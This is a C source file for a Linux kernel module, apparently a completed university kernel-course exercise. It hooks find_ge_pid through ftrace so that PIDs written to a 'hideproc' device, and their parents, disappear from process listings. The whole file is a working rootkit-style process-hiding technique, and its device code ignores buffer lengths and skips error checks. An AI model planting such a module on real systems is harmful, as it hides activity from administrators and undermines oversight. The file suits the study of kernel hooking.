#include <linux/cdev.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>


MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("National Cheng Kung University, Taiwan");

enum RETURN_CODE { SUCCESS };

struct ftrace_hook {
    const char *name;
    void *func, *orig;
    unsigned long address;
    struct ftrace_ops ops;
};

static int hook_resolve_addr(struct ftrace_hook *hook)
{
    /* Lookup the address for a symbol. Returns 0 if not found. */
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long *) hook->orig) = hook->address;
    return 0;
}

// 透過更改 %rip 的下一步指令，強制跳轉到 hook function
static void notrace hook_ftrace_thunk(unsigned long ip,
                                      unsigned long parent_ip,
                                      struct ftrace_ops *ops,
                                      struct pt_regs *regs)
{
    // 利用 container_of 來獲得 原始 hook 的 address
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    // 避免重複調用
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->func;
}

static int hook_install(struct ftrace_hook *hook)
{   
    // 尋找出 find_ge_pid 的 address
    int err = hook_resolve_addr(hook);
    if (err)
        return err;
    
    // 將 ops 取代為 hook_ftrace_thunk
    // 為 ftrace 再進入 kernel 內時，真正執行 callback 的 func
    hook->ops.func = hook_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE |
                      FTRACE_OPS_FL_IPMODIFY;


    // ftrace_set_filter_ip 與 register_ftrace_function 皆是處理函數資訊
 
    // 使用 ftrace_set_filter_ip 建立一個 fliter 來篩選出需要的函數後才執行 hook
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    // 使用 register_ftrace_function 允許 ftrace 調用 hook_ftrace_thunk
    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk("register_ftrace_function() failed: %d\n", err);
         /* Don’t forget to turn off ftrace in case of an error. */
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }
    return 0;
}


void hook_remove(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk("unregister_ftrace_function() failed: %d\n", err);
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk("ftrace_set_filter_ip() failed: %d\n", err);
}


typedef struct {
    pid_t id;
    struct list_head list_node;
} pid_node_t;

LIST_HEAD(hidden_proc);

typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
static find_ge_pid_func real_find_ge_pid;

static struct ftrace_hook hook;

/*  list_for_each_entry_safe(pos, n, head, member)
Pos：the type * to use as a loop cursor.
n：another type * to use as temporary storage
head：the head for your list.
member：the name of the list_head within the struct.
*/

static bool is_hidden_proc(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    // AAA
    list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
        if (proc->id == pid)
            return true;
    }
    return false;
}


static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
{
    struct pid *pid = real_find_ge_pid(nr, ns);
    while (pid && is_hidden_proc(pid->numbers->nr))
        pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
    return pid;
}

// 程式執行的切入點
static void init_hook(void)
{
    real_find_ge_pid = (find_ge_pid_func) kallsyms_lookup_name("find_ge_pid");
    hook.name = "find_ge_pid";
    hook.func = hook_find_ge_pid;
    hook.orig = &real_find_ge_pid;
    hook_install(&hook);
}

static int hide_process(pid_t pid)
{
    pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
    proc->id = pid;
    
    // CCC
    list_add_tail(&proc->list_node, &hidden_proc);
    return SUCCESS;
}

static int unhide_process(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    // BBB
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        if(pid == proc->id){
            list_del(&proc->list_node);
            kfree(proc);
        }
    }
    return SUCCESS;
}

#define OUTPUT_BUFFER_FORMAT "pid: %d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)

static pid_t get_ppid(long cpid)
{
    struct task_struct *child = NULL;
    struct pid *child_pid = NULL;
    struct task_struct *parent = NULL;
    

    child_pid = find_get_pid(cpid);
    child = get_pid_task(child_pid, PIDTYPE_PID);
    parent = child -> real_parent;

    return parent -> pid;
    
}

static int device_open(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static ssize_t device_read(struct file *filep,
                           char *buffer,
                           size_t len,
                           loff_t *offset)
{
    pid_node_t *proc, *tmp_proc;
    char message[MAX_MESSAGE_SIZE];
    if (*offset)
        return 0;

    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        memset(message, 0, MAX_MESSAGE_SIZE);
        sprintf(message, OUTPUT_BUFFER_FORMAT, proc->id);
        copy_to_user(buffer + *offset, message, strlen(message));
        *offset += strlen(message);
    }
    return *offset;
}

static ssize_t device_write(struct file *filep,
                            const char *buffer,
                            size_t len,
                            loff_t *offset)
{
    long pid;
    char *message;
    pid_t ppid;

    char add_message[] = "add", del_message[] = "del";
    if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
        return -EAGAIN;

    message = kmalloc(len + 1, GFP_KERNEL);
    memset(message, 0, len + 1);
    copy_from_user(message, buffer, len);
    if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
        // kstrtol:convert a string to a long
        kstrtol(message + sizeof(add_message), 10, &pid);
        hide_process(pid);
        ppid = get_ppid(pid);
        hide_process(ppid);

    } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
        kstrtol(message + sizeof(del_message), 10, &pid);
        unhide_process(pid);
        ppid = get_ppid(pid);
        unhide_process(ppid);
    } else {
        kfree(message);
        return -EAGAIN;
    }

    *offset = len;
    kfree(message);
    return len;
}

static struct cdev cdev;
static struct class *hideproc_class = NULL;

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
};

#define MINOR_VERSION 1
#define DEVICE_NAME "hideproc"

int MK_DEV;

static int _hideproc_init(void)
{
    int err, dev_major;
    dev_t dev;

    printk(KERN_INFO "@ %s\n", __func__);
    /*
    alloc_chrdev_region：
    Allocates range of char device numbers. 
    The major number will be chosen dynamically, 
    and returned (along with the first minor number) in dev. 
    Returns zero or a negative error code. 
    */
    err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
    dev_major = MAJOR(dev);
    MK_DEV = MKDEV(dev_major, MINOR_VERSION);
    /*
    This is used to create a struct class pointer that can then be used in calls to device_create.
    */
    hideproc_class = class_create(THIS_MODULE, DEVICE_NAME);

    cdev_init(&cdev, &fops);
    cdev_add(&cdev, MK_DEV, 1);

    // device_create：creates a device and registers it with sysfs
    device_create(hideproc_class, NULL, MK_DEV, NULL,
                  DEVICE_NAME);
    
    init_hook();

    return 0;
}

static void _hideproc_exit(void)
{
    
    printk(KERN_INFO "@ %s\n", __func__);
    hook_remove(&hook);
    device_destroy(hideproc_class, MK_DEV);
    class_destroy(hideproc_class);
    cdev_del(&cdev);
    unregister_chrdev_region(MK_DEV, MINOR_VERSION);

    /* FIXME: ensure the release of all allocated resources */
}

/*
module_init()：driver initialization entry point
module_exit()：driver exit entry point
*/
module_init(_hideproc_init);
module_exit(_hideproc_exit);
